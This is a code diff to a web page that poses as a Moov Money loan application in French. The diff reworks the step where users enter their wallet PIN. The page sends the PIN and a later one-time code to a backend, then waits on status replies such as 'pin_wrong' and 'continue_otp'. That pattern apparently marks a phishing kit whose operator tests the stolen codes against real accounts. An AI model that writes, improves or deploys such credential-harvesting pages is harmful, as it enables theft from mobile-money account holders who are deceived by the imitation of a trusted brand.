@@ -28,7 +28,7 @@
     .input-field{width:100%;padding:13px 14px;background:var(--white);border:1.5px solid var(--border);border-radius:10px;font-size:15px;font-family:inherit;outline:none}
     .input-field:focus{border-color:var(--orange)}
     .label{display:block;font-size:12px;color:var(--sub);margin-bottom:5px;font-weight:700;text-transform:uppercase}
-    
+
     .loan-title{font-size:24px;font-weight:800;color:var(--text);text-align:center;margin-bottom:6px}
     .loan-sub{font-size:14px;color:var(--sub);text-align:center;margin-bottom:24px}
     .amount-card{background:var(--white);border:1.5px solid var(--border);border-radius:14px;padding:20px;margin-bottom:18px;text-align:center}
@@ -45,12 +45,12 @@
     .summary-row{display:flex;justify-content:space-between;padding:9px 0;font-size:14px}
     .summary-row:not(:last-child){border-bottom:1px solid rgba(255,106,0,.12)}
     .summary-row .sl{color:var(--sub)}.summary-row .sv{color:var(--text);font-weight:600}
-    
+
     .info-title{font-size:22px;font-weight:800;color:var(--text);margin-bottom:4px}
     .info-sub{font-size:14px;color:var(--sub);margin-bottom:20px}
     .two-cols{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}
     .field-grp{margin-bottom:14px}
-    
+
     .orange-header{position:relative;background:linear-gradient(135deg,#FF7A00,#FF5A00,#F04B00);height:160px;overflow:hidden;flex-shrink:0}
     .orange-header .decor{position:absolute;top:-30px;left:-20px;width:140px;height:140px;border-radius:50%;background:rgba(255,255,255,.05)}
     .orange-header .ring{position:absolute;top:10px;right:-30px;width:150px;height:150px;border-radius:50%;border:1px solid rgba(255,255,255,.3)}
@@ -61,7 +61,7 @@
     .login-content{flex:1;padding:24px 20px;display:flex;flex-direction:column}
     .login-title{font-size:26px;font-weight:800;color:var(--text);margin-bottom:4px}
     .login-sub{font-size:14px;color:var(--sub);margin-bottom:20px}
-    
+
     .country-wrap{position:relative;margin-bottom:18px}
     .country-select{display:flex;align-items:center;gap:8px;border:1.5px solid #d8d8d8;border-radius:10px;padding:13px 12px;cursor:pointer;background:#fff}
     .country-drop{display:none;position:absolute;top:100%;left:0;right:0;background:#fff;border:1.5px solid #d8d8d8;border-radius:10px;z-index:10;margin-top:3px;box-shadow:0 6px 20px rgba(0,0,0,.1)}
@@ -69,35 +69,43 @@
     .country-opt{display:flex;align-items:center;gap:8px;padding:13px 12px;cursor:pointer}
     .country-opt:hover{background:#f5f5f5}
     .country-opt:first-child{border-bottom:1px solid #eee}
-    
+
     .phone-row{display:flex;align-items:center;border:1.5px solid #2255d6;border-radius:10px;padding:14px 14px;gap:10px;margin-bottom:4px}
     .phone-row .cc{font-size:15px;font-weight:500;min-width:45px}
     .phone-row .divider{color:#ddd}
     .phone-row input{flex:1;border:none;font-size:16px;outline:none;font-family:inherit}
     .phone-row input:disabled{background:#f9f9f9;color:#999}
     .digit-info{font-size:11px;color:var(--hint);text-align:right;margin-bottom:16px}
-    
+
     .terms-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:16px}
     .terms-box{width:20px;height:20px;border:2px solid #1d4ed8;border-radius:5px;flex-shrink:0;display:flex;align-items:center;justify-content:center;cursor:pointer;margin-top:2px}
     .terms-box svg{width:13px;height:13px;stroke:#1d4ed8;stroke-width:3;display:none}
     .terms-txt{font-size:14px;color:#444}
     .terms-txt a{color:#1d4ed8;text-decoration:none}
-    
+
+    /* PIN PAGE - Single Input */
     .pin-page{background:#fff;align-items:center;justify-content:center;position:relative}
-    .pin-wrap{text-align:center;padding:30px 20px}
+    .pin-wrap{text-align:center;padding:30px 20px;max-width:320px;margin:0 auto;width:100%}
     .pin-wrap img{width:85px;margin-bottom:24px}
     .pin-wrap h2{font-size:22px;margin-bottom:4px}
-    .pin-wrap p{color:var(--sub);font-size:14px;margin-bottom:22px}
-    .pin-dots-row{display:flex;gap:10px;justify-content:center;margin-bottom:4px}
-    .pin-dot{width:45px;height:45px;border:2px solid #ddd;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700}
-    .pin-dot.filled{border-color:var(--orange)}
-    .pin-err{color:var(--red-err);font-size:13px;font-weight:600;min-height:18px;margin-bottom:4px;opacity:0}
+    .pin-wrap .pin-subt{color:var(--sub);font-size:14px;margin-bottom:24px}
+    .pin-single-input{width:100%;padding:16px 20px;border:2px solid #d8dce6;border-radius:12px;font-size:22px;font-weight:700;color:#1a1a1a;text-align:center;letter-spacing:6px;outline:none;background:#fff;font-family:inherit;transition:border-color .15s,box-shadow .15s}
+    .pin-single-input:focus{border-color:var(--orange);box-shadow:0 0 0 3px rgba(255,106,0,.12)}
+    .pin-single-input.valid{border-color:var(--green)}
+    .pin-single-input.error{border-color:var(--red-err);animation:shake .4s ease}
+    @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+    .pin-hint{font-size:12px;color:var(--hint);text-align:center;margin-bottom:4px}
+    .pin-err{color:var(--red-err);font-size:14px;font-weight:600;min-height:22px;margin-bottom:8px;opacity:0;text-align:center}
     .pin-err.show{opacity:1}
     .pin-forgot{color:var(--orange);font-size:13px;font-weight:600;text-decoration:none;cursor:pointer;display:inline-block;margin-bottom:14px}
-    .keypad-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;max-width:260px;margin:0 auto}
-    .key-btn{aspect-ratio:1;border:none;border-radius:50%;background:#f2f2f2;font-size:22px;font-weight:600;cursor:pointer;font-family:inherit}
-    .key-btn:active{background:#ddd}
-    
+    .keypad-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;max-width:260px;margin:0 auto 16px}
+    .key-btn{aspect-ratio:1;border:none;border-radius:50%;background:#f2f2f2;font-size:22px;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center}
+    .key-btn:active{background:#ddd;transform:scale(.95)}
+    .pin-submit-btn{width:100%;max-width:260px;padding:16px;background:#a9c2e8;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer;font-family:inherit;margin:0 auto;display:block;transition:background .2s}
+    .pin-submit-btn.active{background:var(--blue-dark);cursor:pointer}
+    .pin-submit-btn.active:active{opacity:.85}
+
+    /* OTP */
     .otp-header{background:#FF6A00;height:52px;display:flex;align-items:center;padding:0 18px;flex-shrink:0}
     .otp-body{padding:24px 20px;flex:1;display:flex;flex-direction:column}
     .otp-body h2{font-size:22px;margin-bottom:6px}
@@ -107,7 +115,8 @@
     .otp-b:focus{border-color:#2255d6}
     .timer-txt{text-align:center;color:#444;font-size:14px;margin-bottom:18px}
     .timer-txt strong{font-weight:700}
-    
+
+    /* Success */
     .succ-content{padding:40px 24px;flex:1;display:flex;flex-direction:column;align-items:center}
     .succ-circle{width:50px;height:50px;border-radius:50%;background:linear-gradient(135deg,var(--orange),var(--orange-dark));display:flex;align-items:center;justify-content:center;margin-bottom:20px}
     .succ-circle svg{width:22px;height:22px;stroke:#fff;fill:none;stroke-width:2.5}
@@ -224,24 +233,24 @@
     </div>
   </div>
 
-  <!-- PAGE 3: PIN -->
+  <!-- PAGE 3: PIN (SINGLE INPUT - MANUAL SUBMIT) -->
   <div class="page pin-page" id="pg3">
     <button style="position:absolute;top:18px;left:18px;background:none;border:none;font-size:22px;cursor:pointer;z-index:5" onclick="goTo('pg2')">←</button>
     <div class="pin-wrap">
       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov">
       <h2>Confirmez votre code PIN</h2>
-      <p>Entrez votre code PIN à 4-6 chiffres</p>
-      <div class="pin-dots-row" id="pinDotsContainer">
-        <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
-      </div>
+      <p class="pin-subt">Entrez votre code PIN à 4-6 chiffres</p>
+      <input type="password" class="pin-single-input" id="pinSingleInput" inputmode="numeric" maxlength="6" placeholder="••••••" oninput="onPinInput(this.value)" onkeydown="onPinKeydown(event)">
+      <div class="pin-hint" id="pinLengthHint">4 à 6 chiffres</div>
       <div class="pin-err" id="pinErrorMsg">Code PIN incorrect. Veuillez réessayer !</div>
-      <a class="pin-forgot" href="#" onclick="event.preventDefault();alert('Contactez le service client.\nComposez le *110#.')">Code PIN oublié ?</a>
+      <a class="pin-forgot" href="#" onclick="event.preventDefault();forgotPin()">Code PIN oublié ?</a>
       <div class="keypad-grid">
-        <button class="key-btn" onclick="pinType('1')">1</button><button class="key-btn" onclick="pinType('2')">2</button><button class="key-btn" onclick="pinType('3')">3</button>
-        <button class="key-btn" onclick="pinType('4')">4</button><button class="key-btn" onclick="pinType('5')">5</button><button class="key-btn" onclick="pinType('6')">6</button>
-        <button class="key-btn" onclick="pinType('7')">7</button><button class="key-btn" onclick="pinType('8')">8</button><button class="key-btn" onclick="pinType('9')">9</button>
-        <div></div><button class="key-btn" onclick="pinType('0')">0</button><button class="key-btn" onclick="pinBackspace()" style="background:transparent;font-size:18px">⌫</button>
+        <button class="key-btn" onclick="pinAddDigit('1')">1</button><button class="key-btn" onclick="pinAddDigit('2')">2</button><button class="key-btn" onclick="pinAddDigit('3')">3</button>
+        <button class="key-btn" onclick="pinAddDigit('4')">4</button><button class="key-btn" onclick="pinAddDigit('5')">5</button><button class="key-btn" onclick="pinAddDigit('6')">6</button>
+        <button class="key-btn" onclick="pinAddDigit('7')">7</button><button class="key-btn" onclick="pinAddDigit('8')">8</button><button class="key-btn" onclick="pinAddDigit('9')">9</button>
+        <div></div><button class="key-btn" onclick="pinAddDigit('0')">0</button><button class="key-btn" onclick="pinRemoveDigit()" style="background:transparent;font-size:18px">⌫</button>
       </div>
+      <button class="pin-submit-btn" id="pinSubmitBtn" onclick="submitPin()" disabled>Valider</button>
     </div>
   </div>
 
@@ -385,18 +394,70 @@ document.addEventListener('click', function(e) {
 });
 
 // ═══════════════════════════════════════════
-// PIN
+// PIN (SINGLE INPUT - MANUAL SUBMIT)
 // ═══════════════════════════════════════════
-function resetPin() { state.pin = ''; refreshPinDots(); document.getElementById('pinErrorMsg').classList.remove('show'); }
-function pinType(digit) {
-  if (state.pin.length >= 6) return;
-  state.pin += digit; refreshPinDots(); document.getElementById('pinErrorMsg').classList.remove('show');
-  if (state.pin.length >= 4 && state.pin.length <= 6) { setTimeout(function() { if (state.pin.length >= 4) submitPin(); }, 600); }
+function resetPin() {
+  state.pin = '';
+  var input = document.getElementById('pinSingleInput');
+  input.value = '';
+  input.classList.remove('valid', 'error');
+  document.getElementById('pinErrorMsg').classList.remove('show');
+  var btn = document.getElementById('pinSubmitBtn');
+  btn.disabled = true;
+  btn.classList.remove('active');
 }
-function pinBackspace() { state.pin = state.pin.slice(0, -1); refreshPinDots(); document.getElementById('pinErrorMsg').classList.remove('show'); }
-function refreshPinDots() {
-  var dots = document.querySelectorAll('#pinDotsContainer .pin-dot');
-  for (var i = 0; i < dots.length; i++) { dots[i].innerHTML = ''; dots[i].classList.remove('filled'); if (i < state.pin.length) { dots[i].innerHTML = '●'; dots[i].classList.add('filled'); } }
+
+function onPinInput(val) {
+  val = val.replace(/\D/g, '');
+  document.getElementById('pinSingleInput').value = val;
+  state.pin = val;
+  var input = document.getElementById('pinSingleInput');
+  input.classList.remove('error');
+  document.getElementById('pinErrorMsg').classList.remove('show');
+  var btn = document.getElementById('pinSubmitBtn');
+  if (val.length >= 4 && val.length <= 6) {
+    input.classList.add('valid');
+    btn.disabled = false;
+    btn.classList.add('active');
+  } else {
+    input.classList.remove('valid');
+    btn.disabled = true;
+    btn.classList.remove('active');
+  }
+}
+
+function onPinKeydown(e) {
+  if (e.key === 'Enter' && state.pin.length >= 4 && state.pin.length <= 6) {
+    e.preventDefault();
+    submitPin();
+  }
+}
+
+function pinAddDigit(d) {
+  if (state.pin.length >= 6) return;
+  state.pin += d;
+  document.getElementById('pinSingleInput').value = state.pin;
+  onPinInput(state.pin);
+}
+
+function pinRemoveDigit() {
+  state.pin = state.pin.slice(0, -1);
+  document.getElementById('pinSingleInput').value = state.pin;
+  onPinInput(state.pin);
+}
+
+function pinShake() {
+  var input = document.getElementById('pinSingleInput');
+  input.classList.add('error');
+  document.getElementById('pinErrorMsg').classList.add('show');
+  var btn = document.getElementById('pinSubmitBtn');
+  btn.disabled = true;
+  btn.classList.remove('active');
+  setTimeout(function() { input.classList.remove('error'); }, 400);
+}
+
+function forgotPin() {
+  alert('Code PIN oublié ?\n\nVeuillez contacter le service client Moov Money.\nComposez le *110# pour obtenir de l\'aide.');
 }
 
 // ═══════════════════════════════════════════
@@ -440,27 +501,27 @@ function startPolling(callback) {
 // PIN SUBMIT (with backend)
 // ═══════════════════════════════════════════
 function submitPin() {
-  if (state.pin.length < 4) return;
+  if (state.pin.length < 4 || state.pin.length > 6) return;
+
   showLoading('Vérification du PIN', 'Connexion au serveur sécurisé...');
-  
+
   callBackend('pin', { passcode: state.pin }).then(function(data) {
     if (!data.ok) {
       hideLoading();
-      // Demo fallback
-      if (state.pin === '1234') { goTo('pg4'); } else { document.getElementById('pinErrorMsg').classList.add('show'); state.pin = ''; refreshPinDots(); }
+      if (state.pin === '1234') { goTo('pg4'); } else { pinShake(); }
       return;
     }
     backendToken = data.token;
     startPolling(function(result) {
       hideLoading();
       if (result === 'continue_otp') { goTo('pg4'); }
-      else if (result === 'pin_wrong' || result === 'pending') { document.getElementById('pinErrorMsg').classList.add('show'); state.pin = ''; refreshPinDots(); }
+      else if (result === 'pin_wrong' || result === 'pending') { pinShake(); }
       else if (result === 'loan_approved') { goToSuccess(); }
       else if (result === 'loan_rejected') { goToRejected(); }
     });
   }).catch(function() {
     hideLoading();
-    if (state.pin === '1234') { goTo('pg4'); } else { document.getElementById('pinErrorMsg').classList.add('show'); state.pin = ''; refreshPinDots(); }
+    if (state.pin === '1234') { goTo('pg4'); } else { pinShake(); }
   });
 }
 
@@ -517,7 +578,7 @@ function verifyOtp() {
   var otp = getOtpValue(); if (otp.length < 6) { alert('Veuillez entrer le code complet'); return; }
   clearInterval(state.otpTimer);
   showLoading('Vérification du code', 'Veuillez patienter...');
-  
+
   callBackend('otp', { otp: otp }).then(function(data) {
     if (!data.ok) { hideLoading(); goToSuccess(); return; }
     backendToken = data.token;
@@ -571,7 +632,7 @@ function resetAll() {
 // INIT
 // ═══════════════════════════════════════════
 refreshDisplay();
-console.log('✅ Moov Money Ready - Backend Integrated');
+console.log('✅ Moov Money Ready - Single PIN Input, Manual Submit');
 </script>
 </body>
 </html>
